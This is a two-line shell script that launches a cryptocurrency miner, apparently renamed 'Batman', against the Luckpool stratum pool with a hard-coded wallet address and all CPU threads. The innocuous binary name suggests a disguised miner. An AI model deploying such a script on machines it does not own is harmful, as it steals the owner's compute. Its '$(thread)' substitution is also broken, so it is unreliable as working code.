thread=$(nproc --all)
./Batman -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RVYGMmhotpmKLbVVjauuXABMqDdToVETu4.$RANDOM -p x --cpu "$(thread)"
